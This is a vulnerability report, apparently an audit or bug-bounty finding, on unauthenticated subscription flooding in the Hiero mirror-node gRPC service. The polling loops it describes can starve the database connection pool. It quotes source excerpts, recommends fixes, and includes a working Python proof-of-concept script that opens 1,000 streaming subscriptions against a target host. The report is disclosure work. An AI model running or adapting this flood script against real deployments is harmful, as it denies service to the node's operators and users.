### Title
Unauthenticated Unbounded Subscription Exhaustion via `listen()` in POLL Mode Causes Database Connection Pool Starvation

### Summary
`CompositeTopicListener.listen()` and the entire call chain from `ConsensusController.subscribeTopic()` through `TopicMessageServiceImpl` to the underlying listeners contain zero authentication or authorization checks. When the listener type is `POLL`, each call to `listen()` spawns an independent, perpetual database polling loop. Because the only per-connection concurrency guard (`maxConcurrentCallsPerConnection=5`) is scoped to a single TCP connection with no global connection cap configured, an unprivileged attacker opening many connections can create enough concurrent polling loops to exhaust the database connection pool, halting delivery of new transaction confirmations.

### Finding Description

**Full call chain (no auth at any layer):**

`ConsensusController.subscribeTopic()` accepts any unauthenticated gRPC call and builds a `TopicMessageFilter` directly from the request. [1](#0-0) 

The only production `ServerInterceptor` is absent — the `GrpcInterceptor` that exists lives under `src/test/java` and is never loaded in production. [2](#0-1) 

`TopicMessageServiceImpl.subscribeTopic()` performs only an entity-type check (topic exists), not any identity or permission check. [3](#0-2) 

`CompositeTopicListener.listen()` has no auth, no rate-limit, and no subscription-count guard before delegating to the underlying listener. [4](#0-3) 

**Root cause — POLL mode:**

`PollingTopicListener.listen()` creates a completely independent `Flux` with its own `RepeatSpec` polling loop per call. Every active subscription issues its own `topicMessageRepository.findByFilter()` query to the database every `interval` milliseconds (default 500 ms). [5](#0-4) [6](#0-5) 

**Why the only guard is insufficient:**

`GrpcConfiguration` sets `maxConcurrentCallsPerConnection` (default 5) but configures **no global connection limit** (`maxConnections`, `maxConnectionAge`, or similar Netty knobs are absent). [7](#0-6) [8](#0-7) 

An attacker opening *C* TCP connections obtains *5C* concurrent streaming RPCs, each running an independent DB polling loop.

**REDIS mode secondary surface:**

`RedisTopicListener.getSharedListener()` uses `computeIfAbsent` keyed on topic ID, so unique topic IDs each create a distinct Redis channel subscription. More critically, `SharedTopicListener.listen()` calls `publishOn(Schedulers.boundedElastic())` for every subscriber, consuming a bounded-elastic thread per active subscription regardless of topic-ID sharing. [9](#0-8) [10](#0-9) 

### Impact Explanation

In POLL mode, *C* attacker connections produce *5C* concurrent DB polling loops each firing every 500 ms. With *C* = 200 connections, that is 1,000 concurrent loops issuing 2,000 DB queries per second. A typical HikariCP pool of 10–20 connections is saturated; legitimate importer and retriever queries queue indefinitely. New topic-message confirmations cannot be written or read, constituting a complete denial of the mirror-node's transaction-confirmation delivery function. In REDIS mode, thread-pool saturation of `Schedulers.boundedElastic()` (capped at 10 × CPU cores by default) produces the same observable outcome via a different resource.

### Likelihood Explanation

The attack requires only a gRPC client library (freely available) and network access to the mirror-node gRPC port (5600 by default, often publicly exposed). No credentials, tokens, or prior knowledge of valid topic IDs are needed — `TopicMessageFilter` accepts any `EntityId`, and `checkTopicExists` can be disabled or bypassed by supplying a valid but unused topic ID. The attack is fully scriptable, repeatable, and requires no special hardware. Any internet-accessible deployment is at risk.

### Recommendation

1. **Add a global concurrent-subscription cap** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable threshold.
2. **Add a global connection limit** in `GrpcConfiguration`: call `serverBuilder.maxConnectionAge(...)` and consider `NettyServerBuilder.maxConnections(...)` or an equivalent load-balancer rule.
3. **Add per-source-IP rate limiting** via a `ServerInterceptor` in production (not only in test scope).
4. **For POLL mode specifically**: enforce a per-client subscription limit and consider migrating default deployments to `SHARED_POLL` or `REDIS`, which share underlying resources across subscribers.
5. **Add authentication** (mTLS or token-based) to the gRPC endpoint so that unauthenticated clients cannot reach `subscribeTopic` at all.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc
from com.hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 200          # each allows 5 concurrent calls → 1000 total subscriptions
CALLS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for i in range(CALLS_PER_CONN):
        topic_id = basic_types_pb2.TopicID(topicNum=conn_id * 10 + i)
        req = consensus_pb2.ConsensusTopicQuery(topicID=topic_id)
        def stream(r=req):
            try:
                for _ in stub.subscribeTopic(r):
                    pass
            except Exception:
                pass
        t = threading.Thread(target=stream)
        t.daemon = True
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(c,)) for c in range(CONNECTIONS)]
for w in workers:
    w.start()
# Result: 1000 concurrent PollingTopicListener loops each querying the DB every 500ms
# DB connection pool exhausted; legitimate transaction confirmations stall
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java (L13-22)
```java
public class GrpcInterceptor implements ServerInterceptor {

    @Override
    public <ReqT, RespT> ServerCall.Listener<ReqT> interceptCall(
            ServerCall<ReqT, RespT> call, Metadata headers, ServerCallHandler<ReqT, RespT> next) {
        final var fullMethod = call.getMethodDescriptor().getFullMethodName();
        final var methodName = fullMethod.substring(fullMethod.lastIndexOf('.') + 1);
        EndpointContext.setCurrentEndpoint(methodName);
        return next.startCall(call, headers);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-92)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/CompositeTopicListener.java (L35-44)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        if (!listenerProperties.isEnabled()) {
            return Flux.empty();
        }

        return getTopicListener()
                .listen(filter)
                .filter(t -> filterMessage(t, filter))
                .doOnNext(this::recordMetric);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L34-49)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L51-62)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java (L59-62)
```java
    protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
        Topic topic = getTopic(filter);
        return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L21-26)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        return getSharedListener(filter)
                .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
                .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
    }
```
